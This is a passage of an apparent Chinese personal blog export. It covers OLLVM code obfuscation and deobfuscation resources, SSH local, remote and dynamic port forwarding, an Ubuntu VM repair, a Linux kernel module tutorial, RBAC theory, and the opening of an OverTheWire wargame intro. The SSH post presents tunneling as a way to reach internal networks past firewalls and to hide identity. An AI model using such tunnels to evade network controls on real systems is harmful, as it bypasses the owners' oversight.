在源文件里，类似地，在相应的namespace里定义了这些内容，与之前两个混淆方式类似，substitution继承于FunctionPass，以runOnFuntion函数为入口，里面再判断flag参数正确之后，朴实无华地调用了substitute(tmp)函数己行混淆 主函数substitute()很简单，用一个while循环维护混淆次数(即给的flag参数-sub_loop)，然后两层for循环。第一个for循环用来遍历函数中的基本块(Basic Block)，第二个for循环用于遍历每个基本块中的所有指令，然后采用一个switch-case语句用来针对不同指令的不同替换操作，case里用随机数来决定用哪种方式去替换 接下来的所有代码都是其替换方式的实现 Instructions-Substitution：在其官方wiki里都有说明是怎样的替换方式，在其注释下代码很好理解，相关的函数不懂就查查llvm的函数库就可以了 Add指令支持4种替换方法，分别是 a = b - (-c) a = -(-b + (-c)) r = rand (); a = b + r; a = a + c; a = a – r r = rand (); a = b - r; a = a + b; a = a + r Sub指令支持3种替换方法，分别是 a = b + (-c) r = rand (); a = b + r; a = a - c; a = a – r r = rand (); a = b - r; a = a - c; a = a + r And 指令支持1种替换方法，分别是 a = b &amp; c =&gt; a = (b^~c)&amp; b Or指令支持1种替换方法，分别是 a = b | c =&gt; a = (b &amp; c) | (b ^ c) Xor 指令支持1种替换方法，分别是 a = a ^ b=&gt; a = (!a &amp; b) | (a &amp; !b) StringObfuscation有很多大佬对于ollvm的混淆进行了升级，每个版本对于其混淆的实现方式各不相同，这边我分析的是上海交通大学的孤挺花项目的字符串混淆实现分析，项目地址为：https://github.com/GoSSIP-SJTU/Armariris 与上面三种原有项目的混淆方式不同，字符串混淆的类StringObfuscationPass继承至ModulePass，在入口函数runOnModule里重写了父类函数，在里面实现了加密，在私有函数中实现了解密函数，在加密的末尾实现了调用，保证函数运行的正确性 函数的思想：是以两个vector来存储静态变量和加密后的字符串，利用Module类的global_iterator迭代器遍历全局变量，判断是否为.str.类型，即字符串类型，进行加密替换，加密方式采用了最原始的异或加密 bug寻找适配llvm9.0和ollvm4.0时发生了许多错误 可见 bug_Log Segmentation Fault 的原因若干 最快的当然还是把相关错误的llvm4.0的代码移植到llvm9.0处 解决string_obf error编译时报强制转换类型错误方法 ：http://hellollvm.org/slides/porting-ollvm.pdf http://hellollvm.org/ 对抗//TODO：大坑，现在对逆向还不是很熟悉，先对方法了解一波 引用项目Fllvm(虽然他不开源)中，作者对自己改写的ollvm变版fllvm的自信，来学习对抗ollvm的方式 Fllvm与当前反混淆工具的对抗：当前应对ollvm混淆的大体方法为：自写脚本、bcf、decllvm、符合执行。前三个无论是自己找规律，还是基于capstone(反汇编引擎)，对Fllvm都只存在理论的可行性，基本用途不大。 由作者一段话可知，大概就是找规律写脚本复原，或者采用符号执行的方式去反混淆(原谅我真的找不到作者所说的bcf是啥) 我看的大多找规律的都是从原版ollvm的混淆方式入手，写反混淆的脚本去运行 还是能用符号执行分析的大佬比较nb 资料： 反混淆：恢复被OLLVM保护的程序 [原创]ARM64 OLLVM反混淆 Android OLLVM反混淆实战：基于Angr 基于符号执行的反混淆方法研究.pdf 基于符号执行的反混淆方法研究.pdf 利用符号执行去除控制流平坦化 反混淆：恢复被OLLVM保护的程序 使用Binary Ninja去除ollvm流程平坦混淆 关于逆向：https://blog.yuuoniy.cn/2018/08/03/XMAN-reversing-1/ 基于Miasm框架(一个Python开源逆向工程框架)，进行反混淆 https://github.com/cea-sec/miasm反混淆：恢复被OLLVM保护的程序 IDA插件，利用micro code API进行反混淆 Hex-rays：Hex-Rays Microcode API vs. Obfuscating Compiler项目地址：Github-RolfRolles / HexRaysDeob使用IDA microcode去除ollvm混淆(上) DecLLVM，针对OLLVM的IDA分析插件Github-F8LEFT / DecLLVMGitlab-F8LEFT / DecLLVM吾爱破解2016安全挑战赛cm7 Android CrackMe 分析详解 Unicorn 引擎[翻译]Unicorn引擎教程[原创]使用unicorn engin还原Armariris字符串混淆 Angr 符号执行框架Github里有 关于符号执行： 符号执行是一种重要的形式化方法和软件分析技术，通过使用符号执行技术，将程序中变量的值表示为符号值和常量组成的计算表达式，符号是指取值集合的记号，程序计算的输出被表示为输入符号值的函数，其在软件测试和程序验证中发挥着重要作用，并可以应用于程序漏洞的检测。 符号执行的发展是从静态符号执行到动态符号执行到选择性符号执行，动态符号执行会以具体数值作为输入来模拟执行程序，是混合执行(concolic execution)的典型代表，有很高的精确度，目前较新的符号执行工具有Triton和angr 关于符号执行的paper：https://github.com/saswatanand/symexbib 符号执行的框架：Miasm、Angr、Triton]]></content>
      <categories>
        <category>reverse</category>
        <category>llvm</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>ollvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH端口转发]]></title>
    <url>%2F2020%2F02%2F22%2FSSH-Port-Forwarding%2F</url>
    <content type="text"><![CDATA[SSH端口转发 参考： ssh端口转发的三种方式 SSH 端口转发教程 玩转SSH端口转发 实战 SSH 端口转发 课上看老师演示过，感觉端口转发这个操作真的是贼好用，直接利用外部公网ip连接到了他的虚拟机内网，便想具体学习学习 总所皆知，ssh是我们常用的工具之一，基本快赶上vim的使用频率。我们一般都会使用ssh来进行远程连接服务器，但是这次来学习一次ssh骚操作——ssh端口转发 SSH端口转发也被称作SSH隧道(SSH Tunnel)，因为它们都是通过SSH登陆之后，在SSH客户端与SSH服务端之间建立了一个隧道，从而进行通信。SSH隧道是非常安全的，因为SSH是通过加密传输数据的(SSH全称为Secure Shell)。 SSH有三种端口转发模式，本地端口转发(Local Port Forwarding)，远程端口转发(Remote Port Forwarding)以及动态端口转发(Dynamic Port Forwarding)。对于本地/远程端口转发，两者的方向恰好相反。动态端口转发则可以用于科学上网。 本地端口转发本地端口转发（Local Port Forwarding），是将本地主机某个端口流量转发到远程主机的指定端口。其命令行语法是：ssh -L [bind_address]:localport:remote_host:remote_port。 ssh -L 本地网卡地址:本地端口:目标地址:目标端口 也可以是：ssh -L [bind_address]:port_a:remote_host:port_b user@host 将本地绑定的地址的a端口的流量转发至user@host主机的remote_host的port_b端口 1$ ssh -L 1234:localhost:22 root@remote_ip 如上所示，我们在本地将1234端口的数据转发到远程主机的22端口，访问我本地localhost的1234端口(左)，等于以localhost的身份访问我远程主机22端口 上图中，远程的机器上起了一个服务 python3 -m http.server，它监听端口 8000，现在我们想在本机访问这个服务，但由于防火墙的存在，8000 端口无法直接访问，于是我们使用 ssh 端口转发。首先在 A 上执行 ssh -L 1234:localhost:8000 user_b@ip_b 建立 ssh 隧道，它表示：所有对 A:1234 端口的请求，相当于在 B 机器上对 localhost:8000 的请求。因此在 A 上执行 curl localhost:1234 就相当于访问 B 机器上的 python 服务。 假如web服务部署在其他机器上(Remote Machine C)，可以看到我们只是把上例中的 localhost 换成了 C 机器的 hostname/IP 就可以了。此时，发送到 A:1234 的请求相当于从 B 机器上对 remote:8000 的请求，图中在 /etc/hosts 中设置了 hostname 和 IP 的对应关系，直接用机器 C 的 IP 也是可以的。 同时可以看到，机器 A 由于防火墙无法访问内网的服务，但是由于①机器A可以ssh到内网机器B②B有权限访问到内网的其他服务，通过本地端口转发可以实现从A访问内网的服务。 机器A通过ssh隧道访问本地端口，相当于机器B访问remote:port。 远程端口转发远程端口转发（Remote Port Forwarding），是将将发送到远程端口的请求，转发到目标端口。其命令行语法是：ssh -R 远程网卡地址:远程端口:目标地址:目标端口。 当然也可以是：ssh -R &lt;prot_a&gt;:&lt;remote_host&gt;:&lt;port_a&gt; user_a@ip_a 远程转发最常用的功能是内网穿透。有一个公网ip的主机，便可以借助ssh隧道的远程转发实现内网渗透，达到外网访问内网资源的目的。需要注意的是ssh远程转发默认只能绑定远程主机的本地地址，即127.0.0.1。如果想要监听来自其他主机的连接，需要修改远程主机ssh的配置,将”GatewayPorts”改成“yes”，重启ssh后生效。 如图，假如A可以联网且有公网ip，B可以联网（即可以远程连接A），此时执行命令的是属于内网里且没用公网ip的机器B 我们可以通过访问A的公网ip达到访问内网BC所部署的服务 简单来说在本地执行ssh命令称为本地转发，在远程机器中执行命令就属于远程转发 动态端口转发无论本地转发还是远程转发，都需要指定本地和远程主机的端口。动态转发（Dynamic Port Forwarding）则摆脱这种限制，只绑定本地端口，远程主机和端口由发起的请求决定。动态转发的语法是：ssh -D bind_address:port，也可以是ssh -D &lt;port&gt; user@remote_ip，一个转发示例： 1$ ssh -D 8080 username@host 该命令让ssh监听本地8080端口，经过8080端口的流量都通过ssh隧道由远程服务器代为请求，从而达到获取被屏蔽资源、隐藏真实身份的目的。 这个模式对本地和远程转发都有效，它的工作模式和 Shadow Socks 很像，会在本地创建一个 Socks5 代理服务，监听端口 &lt;port&gt;，并将所有请求转发到远程机器上 动态转发实际上实现了正向代理功能，因此可以用来科学上网。本地转发也可以做正向代理，但要对每一个请求的主机和端口做转发，比较繁琐，实践中不会这么用。 图中我们通过 curl -x socks5h://... 来指定使用 Socks5 代理，在机器 A 上请求 ip_c:8000 时，相当于在 B 机器上发起对 ip_c:8000 的请求。 在我自己的虚拟机和云主机之间实验，有些挺成功的，但也有些失败，比如动态转发这，不知道为啥连上了阿里云的服务器却连不上网，提示连接被重置，有可能是我云端那没有配置好 其次是远程转发时其实翻了好多次车，一直会把端口弄混，但是有个瑕疵就是远程转发时，我启动自己的flask的web服务，却一直curl不到东西，用http.server却成功了，可能是哪里有问题没有发现把]]></content>
  </entry>
  <entry>
    <title><![CDATA[VMware-Ubuntu-blackScreen-fix]]></title>
    <url>%2F2020%2F02%2F20%2FVMware-Ubuntu-blackScreen-fix%2F</url>
    <content type="text"><![CDATA[关于VMware虚拟机中，Ubuntu开机黑屏解决若干相当于Mark 没想到，在写系统安全内核模块时，锁屏开出来后，他界面就崩了，我想着重启能解决一切问题，然后重启完他就凉了 一直在冒一个白色的光标，心想着继续重启看看有没提示 1piix4_smbus:HostSMBuscontrollernotenabled 然后再启动一行时看见这个，搜索解决办法 但是网上都是大同小异的办法——进入终端，禁用模块 但是我没有终端啊 最后查到开机时一直按shift可以进入一个选择启动界面，类似windows的bios 进去后就可以选择恢复模式，以root身份进入 https://blog.csdn.net/jays_/article/details/80848666 https://www.cnblogs.com/elixforever/p/4924492.html 然而解决完再次重启，却还是黑屏，虽然少了那一行，但我已经知道了，这不是关键问题 https://blog.csdn.net/what_about_us/article/details/81207926 然后就想着以黑屏的方式直接搜解决办法，然后就看到上面这个链接有着综合的解释，便学着他mark下来 尝试了其中的办法，发现原来真的是图形界面崩了，按住crtl+alt+F2~6可以进入tty2~6，也就是无图形化终端 想着我下午也同时开过vmware和wegame，然后把vmware给暂停了，搜出来这种情况有可能是LSP问题 https://www.cnblogs.com/zhang-yawei/p/12071970.html ​ 虚拟机和主机之间的通信，基本上是以 socket 的方式进行通信的（这里的 socket 泛指一切 socket，包括本地的、网络的等等）； 某个程序通过 LSP 给系统的 TCP/IP stack 注入了自己的 DLL，如果程序退出时，没有把这个 DLL 收回来，或者回收失败、没有彻底回收等，那么这个 DLL 残留的东西影响了整个 TCP/IP stack，而且是永久性的。 每个 socket 收发的数据包是要经过 TCP/IP stack 的，这个 DLL 可能会对这些 socket 的数据包做了些什么操作（比如修改数据、直接丢弃等等），然后所以你的虚拟机就黑屏了…… netsh winsock reset这条命令会重置，所以那些被注入的 DLL 就被清理掉了，所以一切都是最初的模样了…… 但是我用这个命令重启之后，以为他能恢复原样，但是他没有！ 用tty1的startx进入黑屏，然后他就没法动了，我们进tty2的ps -ef查看进程，发现都是正常的啊 可见gnome正常运行啊 https://askubuntu.com/questions/999180/16-04-to-17-10-login-loop-because-of-xsession-and-upstart 果然还是google靠谱，找到了一个方法，让我看到了桌面，不过又报了下面这行错误 1could not set the configuration for CRTC 63 然后没有搜到解决办法，太晚了，先睡 我们还是从正常方式去debug吧，既然是图形化界面崩了，就去找gnome的错误日志 不过之前调中文还得先搞英文来，太难了 https://wiki.ubuntu.org.cn/%E4%BF%AE%E6%94%B9locale 调完之后，去/var/log下查看日志 太多且太杂了，准备清空日志，重新复现错误 清空日志：https://www.cnblogs.com/Jimmy1988/p/8892483.html 找到疑似的几个错误，注意10:51:02是正常启动完系统进入tty1的时间 后面全是主题解析错误，也就是无法打开桌面 但是根据第二张图的日志中lightdm.service一直在重启失败 LightDM：Light Display Manager，是一个轻量级linux桌面显示管理器 LightDM_百度百科 我们看下服务状态 然后发现服务启动过后，卡在了莫名其妙的地方 想要更新软件包试试 然后发现还没网 https://blog.csdn.net/zhu334974857/article/details/77198545 https://www.geek-share.com/detail/2706261264.html 然后发现应该是dns的问题 然后更新软件包之后，我竟然看到了久违的桌面了 应该就是软件包有相互不兼容的情况导致lightdm启动失败 重装ubuntu桌面，然后有了循环登陆错误 看了下别人的解决办法，没有相符的，大多都是与N卡驱动不兼容，卸载N卡驱动然后重装，结果我想着这思路，前面解决办法中新装了一个unity，我直接apt remove unity然后就进去了woc 终于把这个ubuntu搞好了，果然没有重装解决不了的问题，唯一不好的就是我用的ubuntu16.04一不小心升级成了ubuntu.18.04，不过心情倍爽儿]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux内核编程入门]]></title>
    <url>%2F2020%2F02%2F20%2FLinux-Kernel-Coding-Introdution%2F</url>
    <content type="text"><![CDATA[Linux 内核编程入门&amp;简介 Linux可加载内核模块是 Linux 内核的最重要创新之一。它们提供了可伸缩的、动态的内核。其它开发者可以不用重新编译整个内核便可以开发内核层的程序，极大方便了驱动程序等的开发速度。 参考： 小白学Linux之内核模块编程 linux内核编程 黑客内核：编写属于你的第一个Linux内核模块 linux mod相关命令&amp;内核模块化 linux内核编程入门 hello world 由于系统安全这门课刚上来，就给了一个内核编程的实例，我不得不找些资料学习学习 什么是内核模块：内核模块是具有独立功能的程序。它可以被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间中运行。模块编程和内核版本密切相连，因为不同的内核版本中某些函数的函数名会有变化（所以我在编译老师给的实例时报错了），因此模块编程也可以说是内核编程。 https://lxr.missinglinkelectronics.com/linux：这个网址里可以查到所需用的linux内核函数所在位置 当然，也可以在linux源码下找到，可能比较慢：https://github.com/torvalds/linux（github，search this repository） 内核模块编程特点： 模块本身不被编译进内核映像，从而控制了内核的大小；模块一旦被加载，就和内核中的其他部分完全一样。 Linux驱动程序有两种加载方式：一种是静态地编译进内核，内核启动时自动加载，另一种是编写为内核/驱动模块，使用insmod命令将模块动态加载到正在运行的内核，不需要时用rmmod命令将模块卸载。 上图为linux内核加载过程 用户层编程和内核模块编程的区别 应用程序 内核模块程序 使用函数 libc库 内核函数 运行空间 用户空间 内核空间 运行权限 普通用户 超级用户(superuser) 入口函数 main() module_init() 出口函数 exit() module_exit() 编译 gcc makefile 链接 gcc insmod 运行 直接运行生成的./a.out insmod 调试 gdb kdbug、kdb、kgdb 内核编程：Hello World123456789101112131415161718192021222324252627282930313233#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;//模块许可证声明,必须MODULE_LICENSE("GPL");//模块加载函数,必须static int hello_init(void)&#123; printk(KERN_ALERT "Hello Kernel!"); return 0;&#125;//模块卸载函数,必须static void hello_exit(void)&#123;4printk(KERN_ALERT "goodbye,kernel/n");&#125;//模块的注册module_init(hello_init);module_exit(hello_exit);// 以下可选//声明模块的作者MODULE_AUTHOR("Magic");//声明模块的描述MODULE_DESCRIPTION("This is a simple example!/n");//声明模块的别名MODULE_ALIAS("A simplest example");//声明模块的版本MODULE_VERSION("version_string");//声明设备表,对于USB,PCI等设备驱动,通常会创建一个MODULE_DEVICE_TABLE("table_info"); 在内核编程时，与往常应用编程时类似而又有所不同 开头为内核编程所必须的三个头文件 最明显的就是函数入口由main()变成了module_init，又或者像下面直接写出init_module() 在内核编程中，module_init(begin_func);是指定begin_func为该模块的入口，而相对应的module_exit(exit_func)指定了模块退出时的出口函数为exit_func，这两者皆为模块加载函数 模块加载函数，这部分是必须的。模块加载函数必须以module_init(func)的形式被指定。它返回整形值，若初始化成功，应返回0。在上面那个例子当中，hello_init()函数就是模块加载函数需要执行的，主要是打印一条信息。 跟模块加载函数相对应的就是模块卸载函数，这部分也是必须的。模块卸载函数在模块卸载的时候执行，不返回任何值，必须以module_exit(func)的形式来指定。在上面的例子中，hello_exit()函数就是模块卸载函数需要执行的，只要是打印了一条退出信息。 模块许可证声明，这部分是必须有的。模块许可证（LICENSE）声明描述内核模块的许可权限，如果不声明LICENSE，模块被加载时，将收到内核被污染（kernel tainted）的警告。大多数情况下，内核模块应遵守GPL兼容许可权。Linux2.6内核模块最常见的是以MODULE_LICENSE（&quot;Dual BSD/GPL&quot;)语句声明模块采用BSD/GPL双LICENSE。 再者，其中的函数有所不同，比如printk()是由内核定义的，把要打印的信息输入到系统日志中，可以用dmesg命令查看 >&gt;&gt;此外，模块加载函数有另外一种写法 123456789101112static int __init hello_init(void)&#123; //init printk("hello tiger/n");4return 0;&#125;static void __exit exit(void)&#123; //exit code4printk("bye bye!/n");&#125; 这种写法与前面不同，就是加了__init和__exit前缀，与第一种写法来说，会比较节省内存 __init 和 __exit 是 Linux 内核的一个宏定义，使系统在初始化完成后释放该函数，并释放其所占内存。 在 linux 内核中，所有标示为 init 的函数在连接的时候都放在 .init.text 这个区段内，此外，所有的 init 函数在区段 .initcall.init 中还保存了一份函数指针，在初始化时内核会通过这些函数指针调用这些 __init 函数，并在初始化完成后释放 init 区段（包括 .init.text,.initcall.init 等）。 __exit和 __init 一样， __exit 也可以使对应函数在运行完成后自动回收内存。 之后，编写完C文件之后就要对其进行相对应的操作，把他编译成内核文件。 要知道不同环境下，内核版本不一样的可能性极高，再考虑到路径等问题，为了编译方便，一般都采用Makefile的文件形式，来简化内核版本号、路径、以及编写模块的路径和信息 12345678910111213obj-m += hello.o#generate the pathCURRENT_PATH:=$(shell pwd)#the current kernel version numberLINUX_KERNEL:=$(shell uname -r)#the absolute pathLINUX_KERNEL_PATH:=/usr/src/linux-headers-$(LINUX_KERNEL)#complie objectall: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules#cleanclean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean 这是老师给的样例，还会打印现有的所有进程 123456789101112131415161718192021#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/sched/signal.h&gt;#include &lt;linux/sched/task.h&gt;int init_module()&#123; printk("Hello world\n"); extern unsigned long volatile jiffies; struct task_struct *p = &amp;init_task; do&#123;44printk("%d %s\n", p-&gt;pid, p-&gt;comm); p = next_task(p); &#125; while (p!=&amp;init_task); return 0;&#125;void cleanup_module()&#123;4printk("bye\n");&#125;MODULE_LICENSE("GPL"); 以及其简单的Makefile 12345obj-m := hellops.oKDIR := /lib/modules/$(shell uname -r)/buildPWD := $(shell pwd)default:4$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules 运行结果如上 一些常用的linux内核函数：https://blog.csdn.net/guowenyan001/article/details/43342301 内核模块的操作编写好内核模块的函数之后，经过编译，我们就得到了所要的内核模块的执行文件xxx.ko 以下就是我们可以对这个文件操纵的一些命令 123456$ insmod xxx.ko #将模块装入内核种$ rmmod xxx.ko #将模块从内核种删除$ lsmod | grep xxx #列表显示所有的内核模块，类似ls命令$ modprobe -v xxx.ko #自动处理载入模块，一般用于载入指定的个别模块或一组相依赖的模块$ depmod /PATH/TO/MODULES_DIR #查看模块依赖$ modinfo #查看模块的具体信息 modprobe: modprobe可载入指定的个别模块，或是载入一组相依赖的模块。modprobe会根据depmod所产生的依赖关系，决定要载入哪些模块。若在载入过程中发生错误，在modprobe会卸载整组的模块。依赖关系是通过读取 /lib/modules/2.6.xx/modules.dep得到的。而该文件是通过depmod 所建立。 关于modprobe的相关 模块加载——modprobe和insmod的区别(转) Linux下使用modprobe加载驱动]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Role-Based-Access-Control]]></title>
    <url>%2F2020%2F02%2F19%2FRole-Based-Access-Control%2F</url>
    <content type="text"><![CDATA[Role Based Access Control 参考： Spring Security 实战干货： RBAC权限控制概念的理解 Role-Based-Access-Control__sandhu96.pdf 什么是 Azure 资源的基于角色的访问控制 (RBAC)? Role Based Access Control RBAC的简介 RBAC：Role Based Access Control：基于角色的访问控制 RBAC的概念起源于早期的多用户计算机系统，他的兴起是因为人们需要通用的多用途的可定制工具 RBAC简化了权限管理，与用户组的概念相近 RBAC支持三个著名的安全性原则：最少特权、权限分离、数据抽象 最小特权原则，只有该角色完成任务所需的权利被赋予该角色 职责分离原则，确保互斥角色来完成一项敏感任务，例如比赛中，裁判不能同时是参赛选手 数据抽象原则，权利依靠抽象完成，例如借记卡和信用卡对于一个账户，而不是用操作系统提供的读写执行的权利 对于RBAC，简单来说，就是将用户对应一个身份，而一个身份拥有相应的权限，如下图所示 就如同公司的项目经理，人事经理，上到CEO，CTO等等，每个职位有着相应的权限，而且在每个公司的CTO可以拥有不同的权限，同时CTO也可以由不同人来担任。把这个关系映射到计算机系统来，就是基于角色的访问控制。 相较于直接将权限分配给用户，这种RBAC的机制有着较强的扩展性，也便于权限管理：在权限更改时，无需遍历所有用户，增加了提权的效率，以及降低了漏调权限的概率，这样用户和资源权限解除了耦合性，这就是 RBAC 模型的优势所在。 RBAC的分类RBAC模型可以分为：RBAC0，RBAC1，RBAC2，RBAC3 四种。其中RBAC0为基础，其他都是因RBAC为基础的变种。其中他们的关系可以由下图所示。 RBAC0是最低层的基本模型。RBAC1和RBAC2都包含的RBAC0的所有特征，并且在此基础上添加了一些独立的功能，同时也被称为advanced models RBAC1相较于RBAC0添加了角色继承的概念，即角色可以从其他角色中继承权限，感觉有点类似面向对象中类的继承 RBAC2添加了一些限定条件，简单来说就是为了职责分离，防止既是参赛选手又是裁判的情况出现 RBAC3合并了RBAC1和RBAC2，由于传递性，肯定也包含了RBAC0的特征 RBAC模型的基本特征由下图所示 RBAC0 ——Base model这个模型中，有三组实体：User(用户)，Roles(角色)，Permission(权限)，上图中也有Sessions(会话)的集合 用户：可以是智能的自治代理，例如机器人、静止的电脑甚至是电脑中的网络，简单的，我们可以认为一个用户就是一个人 角色：一个角色就是一个工作职能或工作名(职务名)，具有与授予角色成员的权限和责任的相关联的语义 权限：是一种对系统内一个或多个对象访问的模式的许可，授权条款、访问权限、优先级都象征着权限，权限的概念可以是多样化的 在这个框架里，拒绝访问被认为是一种约束，而不是一种拒绝的权限 权限的性质使其依赖于系统的实现细节和系统本身，因此一个访问控制的通用模型将权限看作为一个扩展的没有解释的符号。每个系统保护着他自己实现的抽象对象，因此操作系统维护着像文件、目录、设备、端口等以及其读写执行的权限。一个关系型数据库管理系统维护着关系、元组、属性、视图以及其insert、update、delete、select等操作 权限可以应用于单个或多个对象 正如上图所说，用户和角色，角色和权限都是多对多的关系。一个用户可以拥有多个角色，一个角色也可以拥有多个用户，相似的，一个角色可以拥有多个权限，一个权限也可以被多个角色所拥有。RBAC的关键性设计就在这两个多对多的关系。这种对应关系最后使得一个用户可以行使一种权利。把角色当作用户和权限的中间人提供了更好的访问控制设置，更加直接的将用户和权限联系起来 对话(Session)：是一种一个用户和多种角色的映射。当用户想要激活他所属的一些角色时，一个用户将会建立起一个对话。在对话里，对话和角色是一对多的关系，用户对应的多种角色在对话里同时被启用，对话里所有角色所拥有的权限都可以被用户所使用。每个对话和一个单一的用户绑定，这种绑定在一个对话的生命周期内保持不变。 在同一时间内，一个用户可能有多个对话，每个对话都在一个不同的工作窗口。每个对话有可能有不同的角色绑定。这个RBAC0的功能支持最小特权原则。一个用户可以激活他所拥有角色集合的任意子集，保证其在一个对话中对于一个任务最合适。因此，拥有一个强大权限的角色一般为不激活，当他被需要时，才去激活他。在一个对话的生命周期内，RBAC0也允许角色的动态激活和失效。 假如将RBAC0以形式化语言说明，那么可以看看下图所示 RBAC1 ——Role hierarchies角色继承是一种结构化角色的方法，去反应组织的权限和责任的结构 这边继承的概念就如面向对象中继承的特性一样，论文中的例子我就不再复述了。 直接在此给出论文中形式化语言的描述 RBAC2 ——Constraints实际上，RBAC1和RBAC2没有包含关系，虽然他们在数字版本上是相邻的。正如RBAC模型的关系里，这两个是属于并列关系的。 约束(Constraints)也是RBAC模型中重要的一方面。 在论文中，是采购经理和财务经理的关系，这两个职责明显不能由同一个人来担任，因为这回造成欺诈。这是一个历史悠久的原则——职责分离。不过对于例子，我更喜欢在博客中看到的这个例子：一个人不能再比赛中同时担任参赛选手和裁判，这明显的会造成比赛公平性缺失，虽然这在现实中几乎不可能发生，但我觉得这是对于这个方面最直观的体现。 约束是在更高等级组织政策中一种有力的机制。确定的角色需要被定义为相互排斥的，即职责分离。 只要RBAC的管理是被一个高级安全官员完全中心化管理的，约束就是非常的方便，同时也体现了高级安全官员的决策影响十分重大。但假如RBAC的管理去中心化，约束就变成了一种机制，使得级别高的安全官员可以限制用户行使管理权限 约束应用于User Assignment和Permission Assignment的关系，使得返回一个函数值为接收或者不接受。 以下是论文中对约束的定义 在这个定义下，权限必须具有原子性 有些角色产生的历史原因就是为了制约另一个角色，裁判员就是为了制约运动员从而让运动员按照规范去比赛。如果一个人兼任这两个角色，比赛必然容易出现不公正的情况从而违背竞技公平性准则。还有就是我们每个人在不同的场景都会充当不同的角色，在公司你就是特定岗位的员工，在家庭中你就是一名家庭成员。随着场景的切换，我们的角色也在随之变化。所以 RBAC2 在 RBAC0 的基础上引入了静态职责分离（Static Separation of Duty，简称SSD）和动态职责分离（Dynamic Separation of Duty，简称DSD）两个约束概念。他们两个作用的生命周期是不同的; SSD 作用于约束用户和角色绑定时。 1.互斥角色：就像上面的例子你不能既是A又是B，互斥的角色只能二选一 ; 2. 数量约束：用户的角色数量是有限的不能多于某个基数； 3. 条件约束：只能达到某个条件才能拥有某个角色。经常用于用户等级体系，只有你充钱成为VIP才能一刀999。 DSD 作用于会话和角色交互时。当用户持有多个角色，在用户通过会话激活角色时加以条件约束，根据不同的条件执行不同的策略。 RBAC3 ——Consolidated ModelRBAC3将RBAC1和RBAC2的特性结合起来，也就是在RBAC0的基础上同时拥有了角色继承和约束的两个特性。 约束可以被应用于角色继承中。例如约束可以限制一个角色的数量，比如一个公司只能有1个ceo；在此模型中，约束可以是多样化的，不仅可以约束角色的数量，也可以约束角色的关系。 约束在某些情况下非常有用，尤其是在更改角色层次结构的权限已经被分散的情况下 管理模型——Management models以上的管理模型都是基于单个安全管理员，在大型系统中，一般都有一个安全管理团队 那么问题就来了，RBAC如何管理自己呢？ 作者给出了如图下这样一种模型 在此模型中，约束应用于RBAC中的任一部分，图中上半部分与和RBAC0的基本模型的类似，增加了下半部分，用于对管理角色(AR)和管理权力(AP)的说明，普通权限只能给普通角色，而管理权限只能给管理角色，这是个内在约束。作者认为在管理管理层次时，只需要一个主要的安全管理员就够了，不需要第二个管理层次来管理第一个。 管理者的权力包括： 修改UA 修改PA 修改角色层次关系 RBAC中的管理权限可以看作是修改用户分配，权限分配和角色层次关系的功能。在管理模型中，必须显式定义这些管理操作的权限。这些权限的确切性质是具体实现，但是他们的一般性质几乎相同。 一般地，每个管理角色都将映射到她负责管理的角色层次结构的某个子集。管理的其他方面也需要限定范围，比如删除行为和修改行为就不一样，可以在此限定范围。 概念理解角色（Role）角色是一个组织中的一个职务职能或职称 角色的概念与在访问控制中的用户组的概念相近，但是一个角色是把一组用户和一些权限关联在一起，而用户组却只能代表一组的用户 多角色分配：假如有一个用户被分配到了多种角色，那么会怎么样呢？RBAC是一个加法模型，因此，该用户会拥有其所分配到的所有角色所具有的权限。 权限（Permission）权限具有原子性，不可再分 在RBAC框架里，拒绝访问被建模为一个约束，而不是一个否定的权限。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Wargame]]></title>
    <url>%2F2020%2F02%2F13%2FCTF-Wargame%2F</url>
    <content type="text"><![CDATA[鉴于最近的状态，看逆向又看不进去，就找了个简单的靶场玩一玩 https://overthewire.org/wargames/ WargamesSuggested order to play the games in Bandit Leviathan or Natas or Krypton Narnia Behemoth Utumno Maze … Bandit From the official tips:There are several things you can try when you are unsure how to continue: First, if you know a command, but don’t know how to use it, try the manual (man page) by entering “man ” (without the quotes). e.g. if you know about the “ls” command, type: man ls. The “man” command also has a manual, try it. Press q to quit the man command. Second, if there is no man page, the command might be a shell built-in. In that case use the “help ” command. E.g. help cd Also, your favorite search-engine is your friend. Learn how to use it! I recommend Google. Lastly, if you are still stuck, you can join us on IRC Level 0关于ssh的用法 1ssh bandit0@bandit.labs.overthewire.org -p 2220 连上主机后便可以开始游戏 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in 